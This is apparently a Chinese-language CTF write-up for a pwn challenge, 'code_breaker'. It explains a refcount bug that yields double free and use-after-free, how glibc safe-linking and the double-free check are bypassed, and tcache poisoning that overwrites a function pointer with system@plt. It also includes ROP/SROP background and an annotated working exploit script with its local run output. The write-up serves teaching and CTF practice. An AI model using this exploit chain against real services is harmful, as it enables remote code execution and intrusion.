    1a2d: 4c 8d bc 24 30 20 00 00  lea r15,[rsp+0x2030]         ; 回應緩衝區
    1a35: 48 89 c7             mov    rdi,rax                    ; rdi = 字串位址
    1a38: ff 15 82 26 00 00    call   QWORD PTR [rip+0x2682]     # 40c0  ★★★ 間接呼叫！
    1a3e: ba 15 00 00 00       mov    edx,0x15
    1a43: 48 8b 74 24 10       mov    rsi,[rsp+0x10]
    1a48: 48 8d bc 24 32 20 00 00  lea rdi,[rsp+0x2032]
    1a50: 66 89 94 24 30 20 00 00  mov WORD PTR [rsp+0x2030],dx ; 回應開頭 = 0x15, 0x00
    1a58: 48 8b 54 24 18       mov    rdx,[rsp+0x18]
    1a5d: b9 00 10 00 00       mov    ecx,0x1000
    1a62: e8 09 f7 ff ff       call   1170 <__memcpy_chk@plt>   ; 回音
    1a71: e8 9a fa ff ff       call   1510                      ; 加密送出
```

`0x1a38` 這一行就是全題的「鑰匙」：**它會用我們完全控制的字串當第一個參數，
去呼叫一個存在可寫 `.bss`（`0x40c0`）裡的函式指標**。

```
0000000000001d08 <cmd 0x16 handler>:
    1d08: 66 0f 6f 05 b0 23 00 00  movdqa xmm0,[rip+0x23b0]  # 40c0
    1d10: 66 0f 6f 0d b8 23 00 00  movdqa xmm1,[rip+0x23b8]  # 40d0
    ... 共 15 個 16-byte 區塊 ...
    1d18: b8 16 00 00 00       mov    eax,0x16
    1d35: be f2 00 00 00       mov    esi,0xf2                  ; 送出 0xf2 = 242 bytes
    1d3a: 66 89 84 24 30 20 00 00  mov WORD PTR [rsp+0x2030],ax  ; 開頭 0x16, 0x00
    1d52: 0f 11 84 24 32 20 00 00  movups [rsp+0x2032],xmm0       ; -> 0x40c0 的內容
    ...
    1e12: e8 f9 f6 ff ff       call   1510                      ; 加密送出
```

送出 `0x40c0 ~ 0x41b0` 共 240 bytes，**第一個 8 bytes 就是 `[0x40c0]` = `PIE+0x1390`**
⇒ 扣掉 `0x1390` 就是 **PIE base**（這題的 leak 就是這麼簡單）。

---

## 3. Stack canary 原理

### 3.1 它是什麼

Canary 是放在「區域變數」與「返回位址」之間的一個 8-byte 隨機值（Linux 上最低位一定是 `\0`，
所以用字串函式讀取時不會意外洩漏）。編譯器會這樣做：

```asm
mov  rax, qword ptr fs:0x28     ; 從 TLS（每個 thread 一份）讀出 canary
mov  qword ptr [rbp-8], rax     ; 存到 stack frame 裡
... 使用者程式碼 ...
mov  rdx, qword ptr [rbp-8]     ; 要 return 前再讀出來
sub  rdx, qword ptr fs:0x28     ; 跟原始值比
jne  __stack_chk_fail           ; 不一樣 ⇒ 有人覆蓋了 stack ⇒ abort
```

本題的實際指令（`0x1900` 這個大函式）：

```
    1947: 64 48 8b 04 25 28 00 00 00  mov rax,QWORD PTR fs:0x28
    1950: 48 89 84 24 38 30 00 00     mov QWORD PTR [rsp+0x3038],rax   ; canary 放在 rsp+0x3038
    1e1c: 48 8b 84 24 38 30 00 00     mov rax,QWORD PTR [rsp+0x3038]   ; 要離開時讀回
    1e24: 64 48 2b 04 25 28 00 00     sub rax,QWORD PTR fs:0x28
    1e2d: 75 4a                       jne 1e79
    1e79: e8 c2 f2 ff ff              call 1140 <__stack_chk_fail@plt>
```

### 3.2 對解題的意義

- 想用「stack buffer overflow 覆蓋 return address」的話，**必須先洩漏 canary** 並在
  payload 中保持它不變（因為 `sub`/`jne` 是精確比對），否則 `__stack_chk_fail` 會讓程式 abort。
- **本題完全不需要碰 canary**：所有可溢出/可寫的地方都寫不到 canary，而且我們的攻擊路線是
  「改函式指標」，不是「改返回位址」。
- 也順便驗證了本題**沒有** stack overflow 可利用：
  - `cmd 0x15` 兩次 `__memcpy_chk` 的 `n = len-1 <= 0xfff`，
    而目的緩衝區 `rsp+0x1030` 到 canary `rsp+0x3038` 之間有 `0x1008` bytes，塞不爆。
  - 接收函式 `0x13f0` 也限制了 `len <= 0x1000`（`cmp si,0x1000; ja 錯誤`）。

---

## 3.5 `heap` 最小語彙：chunk / bin / tcache / safe-linking（讀 §4 之前先看這段）

> 📍 **入門指路**：想更完整地學 heap，請看
> `wp/99_速查表.md` §8（迷你版）與 `../pwn4/notes.md` §5（完整版，含 gdb 實測的 heap 佈局表）。
> 這裡只講「讀 §4 一定用得到」的最小集合。

### (1) chunk：`malloc` 給你的其實是一塊「有標頭」的記憶體

```
        ┌──────────────────────────┐ ← 低位址
        │ prev_size (8 bytes)      │  前一個 chunk 若「正在使用」，這格會被前一個借去當資料
        ├──────────────────────────┤
        │ size      (8 bytes)      │  ★ 這塊的總大小（含標頭），例如 0x91
        ├──────────────────────────┤ ← ★★ P ＝ malloc() 回傳的位址（user data 起點）
        │ user data ...            │  程式與我們能寫的範圍
        └──────────────────────────┘
           chunk 標頭 = P - 0x10
```

- `malloc(0x80)` 真正拿到 **0x90** 的 chunk：`0x80`（user）+ `0x10`（標頭），
  size 固定 16 對齊、**最小 0x20**。
- size 的低 3 bits 是旗標（bit0 `PREV_INUSE`、bit1 `IS_MMAPPED`、bit2 `NON_MAIN_ARENA`），
  要拿真正大小要寫 `size & ~0x7`。
- **本筆記後面寫的 `P` 一律指「`malloc` 回傳的那個 user 位址」**，不是 chunk 標頭；
  標頭要自己算 `P - 0x10`。搞錯會差 0x10，症狀是「程式沒崩、但攻擊目標沒被改到」。

### (2) `free` 之後：chunk 裡會被寫進 `next` / `key`

```
        ┌──────────────────────────┐
        │ prev_size / size         │
        ├──────────────────────────┤ ← P
        │ next (8 bytes)           │  ← ★ 指向「下一塊同 size 的 free chunk」，
        │                          │     glibc 2.32+ 會把這個值**編碼**（見 (4)）
        ├──────────────────────────┤
        │ key  (8 bytes)           │  ← glibc 2.34+ 是隨機的 tcache_key
        ├──────────────────────────┤     （不是指標，所以洩漏不到 heap base）
        │ 舊資料（不會被清掉）     │  ← ★ UAF 讀到的就是這些
        └──────────────────────────┘
```

- `free(p)` **不會**把變數 `p` 清成 NULL，所以「free 過了、指標還在」= **use-after-free（UAF）**。
- 同一格欄位在不同 bin 有不同名字：tcache 叫 `next`/`key`，
  unsorted/small/large bin 叫 `fd`/`bk`，fastbin 只用 `fd`。三個都對，不是衝突。

### (3) bin 與 tcache：glibc 的「回收桶」

```
  free(P) ──► tcache：每個 size 一條 LIFO 鏈，最多 7 塊（0x20…0x410 共 64 條）
                 │  滿了
                 ▼
              fastbin(<= 0x80) ──► unsorted bin ──► small bin / large bin
                                     │
                                     └─ ★ fd/bk 指向 libc 裡的 main_arena → 洩漏 libc base
```

- size → 鏈編號：`tc_idx = (chunk_size - 0x20) / 0x10`（`0x90 → idx 7`）。
- **LIFO**：最後被 free 的，下一次 `malloc` 最先被拿回去。
- 管理這 64 條鏈的結構（`tcache_perthread_struct`）就在 **heap 最開頭**，
  它的 `entries[]` 存的是**明文的 user 位址**（不用解碼）。
- 注意：**fastbin 沒有「7 塊」的上限**（7 是 tcache 的限制）。

### (4) safe-linking（glibc ≥ 2.32）：`next` 會被加密

```c
#define PROTECT_PTR(pos, ptr)  ((pos) >> 12) ^ (ptr)
```

- `pos` ＝ **「存放這個指標的那一格」的位址**；在 tcache 裡 `e = chunk2mem(p)`，
  所以 `pos = &e->next = e = P`（**user 位址**）。
- 寫入：`stored = (P >> 12) ^ 目標`；讀出：`目標 = (P >> 12) ^ stored`。
- 編碼只用得到 `P >> 12`（高位）⇒ **攻擊者不需要知道完整位址**，
  只要想辦法洩漏 `P >> 12` 就能偽造 `next`。
- 本題就是先靠「free 到空鏈」讀到 `P >> 12`，再用「P → P 的自我參照環」把整個 `P` 解回來
  （§4.3，含 gdb 實測）。

---

## 4. 本題漏洞：refcount 算錯 ⇒ double free / use-after-free

### 4.1 為什麼會壞

`clone`（指令 0x14）讓 **兩個 slot 指向同一塊 chunk**，但：

```
1e62: mov WORD PTR [rcx+0xa],0x1     ; slot[A].refcount = 1     （← 重新設定成 1，不是「共用」）
1e6b: add WORD PTR [rax+0xa],0x1     ; slot[B].refcount++
```

⇒ 兩邊各自有一個獨立的計數器。於是：

```
1. alloc 0 0x80                       -> slot0.ptr = P, slot0.rc = 1
2. clone 1 <- 0（A=1 空, B=0）         -> slot1.ptr = P, slot1.rc = 1, slot0.rc = 2
3. free 0                             -> free(P)  ⇒ P 進 tcache
                                         slot0.rc = 2-1 = 1 ≠ 0 ⇒ 「ptr 不設成 NULL」⇒ slot0 仍然指著 P！
4. write 0 <16 bytes>                 -> memcpy(P, ...)  ← 對「已釋放」的 chunk 寫 = UAF write
                                         剛好把 tcache 的 next(0..7) 和 key(8..15) 清成 0
5. free 1                             -> free(P) 再一次 ⇒ ★ double free ★
```

第 5 步為什麼不會被 glibc 的 double-free 偵測攔下來？glibc 2.29+ 在 `_int_free` 裡檢查：

```c
tcache_entry *e = chunk2mem(p);
if (e->key == tcache) {          /* 已經被放進 tcache 過？ */
    for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
        if (tmp == e) malloc_printerr("free(): double free detected in tcache 2");
}
```

它比對的是 **`e->key` 這個欄位**（glibc ≥ 2.34 是隨機的 `tcache_key`）。我們在第 4 步
**用 UAF write 把 `key` 清成 0**，所以 `e->key != tcache_key`，檢查直接放行。

### 4.2 同時拿到三種能力

| 能力 | 靠哪個指令 | 備註 |
|---|---|---|
| **UAF read**（洩漏 heap） | 0x11 read | slot0 還「以為」自己有 ptr，讀出來就是 tcache 的 `next`/`key` |
| **UAF write** | 0x12 write | 可以改 tcache 的 `next`（tcache poisoning） |
| **double free** | 0x13 free | 讓同一個 chunk 在 tcache 裡出現（形成環狀串列） |

### 4.3 safe-linking（glibc ≥ 2.32）怎麼破

先把 `P` 定義清楚（**後面每一節都用這個定義**，請不要跟 chunk 標頭混用）：

```
   P = cb.alloc() 之後 malloc() 回傳的那個位址      ★ 就是「user data 起點」
   chunk 標頭 = P - 0x10
   （本題 CHUNK = 0x80 ⇒ malloc(0x80) ⇒ chunk size 0x90 ⇒ tcache idx 7）
```

glibc 從 2.32 起把 tcache/fastbin 的 `next` 指標**加密**：

```c
#define PROTECT_PTR(pos, ptr)  ((pos) >> 12) ^ (ptr)    /* pos = &e->next */
寫入時: stored = (pos >> 12) ^ ptr
讀取時: ptr    = (pos >> 12) ^ stored
```

因為 `e = chunk2mem(p)`，而 `next` 就位在 user data 的第 1 格，所以
**`pos = &e->next = e = P`（＝ malloc 回傳的 user 位址，不是 chunk 標頭）**。

> ⚠️ **新手最容易錯的兩件事**
> 1. **拿 `P - 0x10`（chunk 標頭）去 XOR。** 由於 `>>12` 丟掉低 12 bits，
>    只要 `P` 與 `P-0x10` 落在同一頁（絕大多數情況）算出來的值**剛好一樣**，
>    於是「看起來能動」；但如果 `P` 的位址低 12 bits 是 0（頁開頭）就會差 1，
>    而且觀念是錯的。**請一律用 `P`。**
> 2. **把「攻擊目標」也當成 chunk。** `[0x40c0]` 這個函式指標**就是**那塊假 chunk 的
>    user data 起點，所以目標要填 `PIE+0x40c0`，**不是** `PIE+0x40d0`。
>    填成 `+0x40d0` 的症狀是：程式完全沒崩，但 `[0x40c0]` 還是原本的 stub
>    （因為 `+0x40c0` 是 16 對齊，`aligned_OK` 檢查也不會救你）。

因為第 3~5 步造成 tcache 串列變成「P → P」的環，所以 P 的 `next` 會被寫成
`P ^ (P >> 12)`（自我參照！）。於是：

```
P ^ (P >> 12) = leaked
```

這個方程式可以用**迭代法**解出來（低位 12 bits 不受影響，很快收斂）：

```python
p = leaked
for _ in range(8):
    p = leaked ^ (p >> 12)      # 收斂後 p 就是 P（malloc 回傳的 user 位址）
```

> 小知識：glibc ≥ 2.34 的 `tcache_entry.key` 不再是 `tcache` 指標，而是隨機值
> `tcache_key`，所以**不能**用它來洩漏 heap。這裡我們靠上面的自我參照式解出 P。

#### gdb 實測（題目附的 glibc 2.39，可照抄重現）

把本題的 heap 流程抽成最小的 C 程式（`free` → UAF 寫清 next/key → 再 `free` 一次）：

```bash
cat > /tmp/tr2.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(void){
    void *P = malloc(0x80);
    memset(P, 'A', 0x80);
    free(P);                 /* line 7  : free #1，tcache[0x90] 原本是空的 */
    printf("state-a\n");     /* line 8  ← 中斷點 1 */
    memset(P, 0, 16);        /* line 9  : UAF write，把 next + key 清成 0 */
    free(P);                 /* line 10 : free #2 → 靜默的 double free */
    printf("state-b\n");     /* line 11 ← 中斷點 2 */
    return 0;
}
EOF
gcc -O0 -g -o /tmp/tr2 /tmp/tr2.c
cp /tmp/tr2 /tmp/tr2_p            # gdb 要載入題目的 2.39，所以先 patchelf
patchelf --set-interpreter "$PWD/ld-linux-x86-64.so.2" --set-rpath "$PWD" /tmp/tr2_p

gdb -q -batch \
  -ex 'break /tmp/tr2.c:8' -ex 'break /tmp/tr2.c:11' -ex 'run' \
  -ex 'printf "P=%p  P-0x10=%p  P>>12=%#lx\n", P, (char*)P-0x10, (unsigned long)P>>12' \
  -ex 'x/2gx P' -ex 'continue' -ex 'x/2gx P' /tmp/tr2_p
```

實測輸出：

```
Breakpoint 1, main () at /tmp/tr2.c:8
P=0x55555555b2a0  P-0x10=0x55555555b290  P>>12=0x55555555b
0x55555555b2a0: 0x000000055555555b   0x8885eebd61c58fb7
                └ next ──────────┘   └ key ─────────────┘
Breakpoint 2, main () at /tmp/tr2.c:11
0x55555555b2a0: 0x000055500000e7fb   0x8885eebd61c58fb7
```

| 狀態 | `next` 欄位（P 的前 8 bytes） | 意義 |
|---|---|---|
| (a) free #1 之後（鏈是空的） | `0x55555555b` | **`next == P >> 12`** ★ 這就是 leak 出來的 safe-linking key |
| (b) 清 key + 再 free 一次之後 | `0x55500000e7fb` | **`next == P ^ (P >> 12)`** ★ 自我參照環 P → P |

驗算：`0x55555555b2a0 ^ 0x55555555b = 0x55500000e7fb` ✔（`key` 欄位是隨機的
`tcache_key`，每次執行都不一樣，gdb 裡預設關掉 ASLR 所以 `P` 每次相同）。

兩件事因此被證實：**空鏈時 `next == P>>12`**、**double free 後 `next == P ^ (P>>12)`**。
（附帶一提，這次 `(P-0x10)>>12` 算出來也是 `0x55555555b` —— 正是上面警告
「拿標頭去算看起來也會動」的原因；但請照定義用 `P`。）

---

## 5. 從零開始學 ROP（與為什麼本題其實不需要它）

### 5.1 什麼是 gadget

程式裡到處都是 `ret`（`c3`）。**gadget = 以 `ret` 結尾的一小段指令**。
攻擊者只要控制 stack 上的內容，就可以用「一次 `ret` 跳一段」的方式把許多小片段串起來，
這就是 **Return-Oriented Programming（ROP）**。

最經典、最常用的 gadget 是：

```
pop rdi ; ret      ; 從 stack 取出 8 bytes 放到 rdi，然後 ret
```

為什麼有用？因為 **`rdi` 是函式的第一個參數**。想呼叫 `system("/bin/sh")` 就需要
`rdi = &"/bin/sh"`，而 `pop rdi ; ret` 正好可以從我們控制的 stack 上「彈」一個值進 `rdi`。

本題的 gadget（實測 `ROPgadget`）：

```bash
$ ROPgadget --binary code_breaker | grep ': pop rdi ; ret$'
0x0000000000001e3f : pop rdi ; ret
$ ROPgadget --binary code_breaker | grep ': ret$'
0x000000000000101a : ret
$ ROPgadget --binary libc.so.6 | grep ': pop rdi ; ret$'
0x000000000010f75b : pop rdi ; ret
$ ROPgadget --binary libc.so.6 | grep ': ret$'
0x000000000002882f : ret
```

用 pwntools 也可以：

```python
elf = ELF('./code_breaker', checksec=False)
rop = ROP(elf)
rop.rdi                      # 自動找 pop rdi; ret
rop.call('system', [binsh])  # 自動組出呼叫
print(rop.dump())
```

### 5.2 ret2libc 的公式

```
system 位址 = libc_base + libc.symbols['system']        # 本題 libc: 0x58740
"/bin/sh" 位址 = libc_base + 0x1cb42f                   # ROPgadget --string '/bin/sh'
libc_base  = 洩漏到的某個 libc 函式位址 - 該函式的 offset
PIE base   = 洩漏到的程式位址 - 該位址的檔案內 offset
```

本題的真實數值（已驗證）：

```
[0x40c0] 內容 = PIE_base + 0x1390        ⇒ PIE_base  = leaked - 0x1390
system@plt    = PIE_base + 0x1150
目標函式指標   = PIE_base + 0x40c0
```

### 5.3 對應到本題

本題的 `cmd 0x15` 直接做了「ROP chain 想達成的事」：

```
1a35: mov rdi,rax             ; rdi = 我們送的字串（第一參數）
1a38: call QWORD PTR [0x40c0] ; 呼叫 [0x40c0]
```

所以只要 `[0x40c0] = system@plt`，就等於是 `system(我們的字串)`
——**不用自己排 ROP chain，也不用管 stack 對齊**（因為那是編譯器產生的正常 `call`）。
這就是「**函式指標覆寫**」比 ROP 更省事的情況。

（如果沒有這個間接呼叫，就得走：洩漏 canary → 覆蓋 return address → ROP chain：
`ret; pop rdi; ret; &"/bin/sh"; system`。）

### 5.4 16-byte 對齊與 `movaps` 崩潰

System V ABI 要求：**執行 `call` 時 `rsp` 必須是 16 的倍數**。有些 libc 函式（例如
`system` 內部會用到 SSE 的 `movaps`）如果 `rsp` 沒對齊，會直接丟 `SIGSEGV`
（錯誤訊息通常長得像 `movaps xmmword ptr [rsp+0x40], xmm0`）。

用 ROP 時我們是自己排 stack，很容易差 8 bytes，所以慣用手法是**在 chain 前面多塞一個
`ret`（單獨的 `ret` gadget）**，等於多 pop 一次、把 `rsp` 推移 8 bytes 修正對齊。

本題不需要（正常 `call` 進去，對齊由編譯器保證），但這是必踩的坑。

### 5.5 SROP 是什麼（補充）

**SROP = Sigreturn-Oriented Programming**。原理：Linux 的 signal handler 返回時會執行
`rt_sigreturn`（syscall `rax = 15`），核心會從 stack 上讀一個 **sigcontext 結構**並把
**所有暫存器**都還原。於是只要：

```
1. 控制 rax = 15
2. 執行 syscall
3. stack 上排好假的 sigcontext（可以指定 rax=59, rdi=&"/bin/sh", rip=syscall, ...）
```

就能用極少的 gadget 做「任意 syscall」（例如 `execve("/bin/sh",0,0)`）。
常用工具是 pwntools 的 `SigreturnFrame()`：

```python
frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
payload = flat([syscall_gadget, frame])
```

本題不需要 SROP（有現成的 `system@plt`），但當程式**沒有** `system`／`pop rdi` 等
好用 gadget 時，SROP 往往是唯一出路。

---

## 6. ASCII 圖：記憶體佈局

### 6.1 `0x1900`（指令主迴圈）的 stack frame

```
        低位址
        ┌────────────────────────────────────────────────┐
 rsp+0x00│ [rsp+0x08] = &len （區域變數）                │
         │ [rsp+0x10] / [rsp+0x18] = cmd 0x15 暫存 src/n │
 rsp+0x2c│ u16 len（0x13f0 寫進來；上限 0x1000）         │
 rsp+0x30├───────────────────────────────────────────────┤
         │ msg[0x1000]  ← 收到的（已解密的）訊息         │
         │   0x30 = cmd, 0x31.. = 參數                   │
 rsp+0x1030├─────────────────────────────────────────────┤
         │ cmd 0x15 的 null-terminated 字串緩衝 (0x1000) │
         │   __memcpy_chk 的 dest 就是這裡               │
 rsp+0x2030├─────────────────────────────────────────────┤
         │ 回應緩衝區（cmd 0x11/0x15/0x16 用）0x1008 大  │
 rsp+0x3038├─────────────────────────────────────────────┤
         │ **canary**（fs:0x28）                         │
 rsp+0x3040├─────────────────────────────────────────────┤
         │ (padding)                                     │
 rsp+0x3048├─────────────────────────────────────────────┤
         │ saved rbx  (0x3048) → rbp(0x3050) →r12(0x3058)│
         │ → r13(0x3060) → r14(0x3068) → r15(0x3070)     │
 rsp+0x3078├─────────────────────────────────────────────┤
         │ return address → main 的 0x124a               │
         └───────────────────────────────────────────────┘
        高位址
```

### 6.2 全域變數（`.bss` / `.data`）

```
 0x40c0 ┌──────────────────────────────┐
        │ void (*handler)(char *)  ← ★ │  預設 = PIE+0x1390（endbr64; ret）
 0x40c8 ├──────────────────────────────┤
        │ "CodeBreaker\0\0\0\0"        │
 0x40d8 │ 0 ...                        │
 0x4108 │ "2.1.4"                      │
 0x4128 │ 0x30                         │
 0x4130 │ 0 ...（cmd 0x16 會一起 dump）│
 0x41c0 ├──────────────────────────────┤
        │ slot[0]  ptr/size/refcount   │  16 個 slot × 16 bytes
        │ slot[1]  ...                 │
        │ ...                          │
 0x42c0 ├──────────────────────────────┤
        │ u32 收方計數器 (0x42c0)      │
 0x42c4 │ u32 送方計數器 (0x42c4)      │
 0x42d0 │ K[16]（金鑰表）              │
        └──────────────────────────────┘
```

### 6.3 Heap 攻擊佈局

> 圖裡的 `P` ＝ **`cb.alloc()` 之後 `malloc` 回傳的那個 user 位址**；
> chunk 標頭在 `P - 0x10`（見 §3.5 (1)）。

```
攻擊前：                           攻擊後：
  heap                               heap
  ┌──────────────┐                   ┌──────────────┐
  │ ...          │                   │ ...          │
  ├──────────────┤ ← P - 0x10        ├──────────────┤ ← P - 0x10
  │ size = 0x91  │   chunk 標頭      │ size = 0x91  │   chunk 標頭
  ├──────────────┤ ← P               ├──────────────┤ ← P ★ malloc 回傳值
  │  'A' * 0x80  │   slot0.ptr                      │ next = TARGET ^ (P>>12)  ← 假造！
  │              │   slot1.ptr                      │ key  = 0                 ← 清掉，繞過 double free 檢查
  └──────────────┘                   └──────────────┘
   tcache[0x90] head = P              tcache[0x90] head = P → TARGET(=PIE+0x40c0)
```

**`P` 的三態（就是 §4 的三步；gdb 實測見 §4.3）：**

```
 (a) free #1：P 進「空的」tcache[0x90]
     entries[7] ──► [P]        P->next = (P>>12) ^ NULL = P >> 12   ← key 洩漏處

 (b) UAF 寫清 next/key + free #2（double free）
     entries[7] ──► [P] ──next──► [P]      P->next = P ^ (P>>12)     ← 環！可還原出 P

 (c) 把 P->next 改成 (P>>12) ^ (PIE+0x40c0)
     entries[7] ──► [P] ──next──► 0x…40c0
                     ▲                 ▲
        malloc #1 回傳 ┘                 └─ malloc #2 回傳「.bss 的函式指標那一格」
```

接著：

```
malloc(0x80) → 回傳 P        （tcache 取出 P，head 變成 TARGET）
malloc(0x80) → 回傳 TARGET！ （= PIE+0x40c0，.bss 裡的函式指標位址）
之後 cmd 0x10 的 memcpy 就會把 system@plt 寫進 0x40c0
```

`TARGET` 必須 **16-byte 對齊**（glibc 有 `aligned_OK(e)` 檢查，本題 PIE base 是
page-aligned，`+0x40c0` 一定是 16 對齊）。
再強調一次：`TARGET` ＝ **「存放函式指標那一格的位址」**（= 那塊假 chunk 的 user 起點），
**不是** `PIE+0x40d0`；填成 `+0x40d0` 的話 `[0x40c0]` 根本不會被改到。

#### 為什麼 `CHUNK = 0x80`？

`cmd 0x10` 只限制 `1 <= size <= 0x400`，所以 size 其實可以自己挑。選 `0x80` 的理由：

1. chunk 變 `0x90` → tcache idx 7，而**這條鏈在本題流程裡一定是空的**（乾淨可控）；
2. 要寫進 `0x40c0` 的內容需要 `0x80` bytes 的 `__memcpy_chk` 目的地大小
   （`destlen = size`），用 `p64(system@plt)` + 補 0 剛剛好。
   換成別的 size（例如 `0x20`）一樣能打，只要對應的 tcache size class 是空的、
   而且 payload 塞得下 `system@plt` 就好。

### 6.4 最終 payload（cmd 0x15 的內容）

```
      ┌───────┬───────┬──────────────────────────────────────────────────────┐
      │ 00 47 │ 0x15  │ "cat flag.txt /flag /home/*/flag.txt 2>/dev/null;    │
      │       │       │  ls -la; id; echo DONE"                              │
      └───────┴───────┴──────────────────────────────────────────────────────┘
       len=0x47  cmd                   指令本體 70 bytes
```

- 這是 `exploit.py` 真正送出的那一封：`cb.cmd(b'\x15' + shell_cmd)`。
- 最前面的 2 bytes 是 **big-endian 長度前綴**，算的是「長度前綴**之後**的全部 bytes」
  （含 cmd 那 1 byte）：`70 + 1 = 71 = 0x47` ⇒ 前綴是 `00 47`。
  （如果只想示範最小案例 `b'\x15' + b'/bin/sh\0'`，長度會是 `2 + 1 + 8 = 11 = 0x0b`，
  但本題不建議這樣做，見 §9 坑 12。）
- `0x15` 之後的整段字串會被 `__memcpy_chk` 複製到 `rsp+0x1030` 並補上 `'\0'`，
  再當成 `rdi` 傳給 `[0x40c0]`（此時已經是 `system@plt`）⇒ `system(整條指令)`。

---

## 7. `exploit.py` 逐行註解

```python
OFF_FUNC_PTR = 0x40c0      # 被 cmd 0x15 呼叫的函式指標（我們的攻擊目標）
OFF_STUB     = 0x1390      # endbr64; ret：main 一開始塞進 [0x40c0] 的值 ⇒ 可用來算 PIE base
OFF_SYSTEM   = 0x1150      # system@plt
SBOX_OFF     = 0x2040      # 檔案內 0x2040 就是 .rodata 的 256-byte S-box
```

```python
def p16be(n): return struct.pack('>H', n)   # 協定長度/大小都是 big-endian
S = load_sbox()                             # 直接從檔案讀 S-box
```

```python
class CodeBreaker:
    def raw_send(self, payload):            # 明文送出：2-byte 長度 + 資料
        self.io.send(p16be(len(payload)) + payload)
    def raw_recv(self):                     # 明文接收
        n = struct.unpack('>H', self.io.recvn(2))[0]
        return self.io.recvn(n) if n else b''
```

```python
    def ks(self, C, n):
        # keystream(C,i) = S[(C + i + K[i & 0xf]) & 0xff]
        #   C = 這封訊息開始時的絕對 offset（計數器）
        #   i = 訊息內的索引（注意 K 的索引是 i&0xf，不是 (C+i)&0xf！）
        return bytes(S[(C + i + self.K[i & 0xf]) & 0xff] for i in range(n))
    def xor_stream(self, data, C):
        return xor(data, self.ks(C, len(data)))   # 加解密同一個函式
```

```python
    def handshake(self):
        msg = self.raw_recv()               # 1) 收 01 || Ns（明文）
        Ns = msg[1:17]
        Nc = os.urandom(16)
        self.raw_send(b'\x02' + Nc)         # 2) 送 02 || Nc（明文）
        self.K = self.derive_key(Ns, Nc)    # 3) 用兩個 nonce 算出 16-byte 金鑰表
        mac = bytes(S[self.K[i]] ^ self.K[(i + 5) & 0xf] for i in range(16))
        self.raw_send(self.xor_stream(b'\x03' + mac, 0))   # 4) 送 03 || MAC（counter=0 加密）
        self.rx = 17                        # 之後「送」的 stream offset = 17
        resp = self.xor_stream(self.raw_recv(), 0)         # 5) 收 04 00（counter=0）
        self.tx = 2                         # 之後「收」的 stream offset = 2
        assert resp[1] == 0x00, 'handshake rejected: %r' % resp
```

```python
    def cmd(self, payload):                 # 送一個指令（自動用 rx 當 stream offset）
        self.raw_send(self.xor_stream(payload, self.rx)); self.rx += len(payload)
    def resp(self):                         # 收一個回應（自動用 tx）
        raw = self.raw_recv(); out = self.xor_stream(raw, self.tx); self.tx += len(raw)
        return out
```

```python
    def alloc(self, idx, size, data):       # 指令 0x10：malloc 並存進 slot[idx]
        r = self.req(bytes([0x10, idx]) + p16be(size) + data)
        assert r[1] == 0                    # 回應 [0x10][00] = 成功
```

```python
    def read(self, idx):                    # 指令 0x11：回傳 slot 內容
        # 回應格式是 [0x11][0x00][size_be16][data...]（4-byte 標頭！）
        r = self.req(bytes([0x11, idx]))
        size = struct.unpack('>H', r[2:4])[0]
        return r[4:4 + size]
```

主流程（`main()`）：

```python
    # 1) PIE leak：指令 0x16 dump 出 0x40c0 起 240 bytes（加密傳送，我們自己解）
    dump = cb.dump()
    base = u64(dump[2:10]) - OFF_STUB        # dump[0]=0x16, dump[1]=0x00, 再來才是資料
    system_plt = base + OFF_SYSTEM
    func_ptr   = base + OFF_FUNC_PTR

    # 2) 製造 double free
    cb.alloc(IDX_VICTIM, CHUNK, b'A' * CHUNK)  # slot0.ptr = P
    cb.clone(IDX_ALIAS, IDX_VICTIM)            # slot1 = slot0（共用 P）
    cb.free(IDX_VICTIM)                        # free(P)，但 slot0.ptr 仍留著（refcount 1）
    cb.write(IDX_VICTIM, 16, b'\x00' * 16)     # UAF write：把 tcache 的 next / key 清 0
    cb.free(IDX_ALIAS)                         # 再 free(P) 一次 → double free 成功

    # 3) heap leak：UAF read 讀 P 的前 16 bytes
    leak = cb.read(IDX_VICTIM)
    stored_next = u64(leak[0:8])               # = P ^ (P >> 12)（自我參照環）
    P = reveal(stored_next)                    # 迭代解出 P
    # ★ P = malloc 回傳的 user 位址（chunk 標頭是 P - 0x10，別拿去 XOR）

    # 4) tcache poisoning：把 P 的 next 設成 0x40c0（編碼時要 XOR (P>>12)）
    cb.write(IDX_VICTIM, 16, p64(func_ptr ^ (P >> 12)) + p64(0))

    # 5) 兩次 alloc：第一次拿回 P，第二次就拿回 TARGET
    cb.alloc(IDX_TMP, CHUNK, b'B' * CHUNK)
    cb.alloc(IDX_TARGET, CHUNK, p64(system_plt) + b'\x00' * (CHUNK - 8))  # 寫入 0x40c0

    # 6) 驗證 + 觸發：cmd 0x15 會 call [0x40c0](我們的字串) = system(我們的字串)
    back = cb.read(IDX_TARGET)
    assert u64(back[0:8]) == system_plt
    cb.cmd(b'\x15' + b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE')
```

> 為什麼第 5 步的 `alloc` 不會壞？
> `cmd 0x10` 會 `memcpy(slot.ptr, msg+4, size)`，也就是把我們的 0x80 bytes
> **寫到 `0x40c0`**，第一個 8 bytes 就是 `system@plt`，其它填 0（`0x40c8` 之後只是版本字串／
> 空槽，不影響程式邏輯）。

---

## 8. 實際輸出

### 8.1 本機（`printf 'sun{local_test_flag}' > flag.txt`）

```
$ python3 exploit.py
[x] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2'
[+] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2': pid 3544661
[+] handshake ok, key schedule = c019d1695f0ac1565baaa2db1d5b4b0e
[+] PIE base = 0x7f60fba50000
[*] target function pointer @ 0x7f60fba540c0  ->  system@plt 0x7f60fba51150
[+] heap leak: stored_next=0x5550d95af4a3 tcache_key=0x78d66b85f51864dd
[+] victim P (malloc user ptr) = 0x55558c023480
[+] wrote system@plt into <0x7f60fba540c0>
[+] verified: [0x7f60fba540c0] == 0x7f60fba51150
[*] triggering system(b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE')
sun{local_test_flag}
total 2520
drwxr-xr-x  2 kzzz kzzz    4096 Sep 28 01:01 .
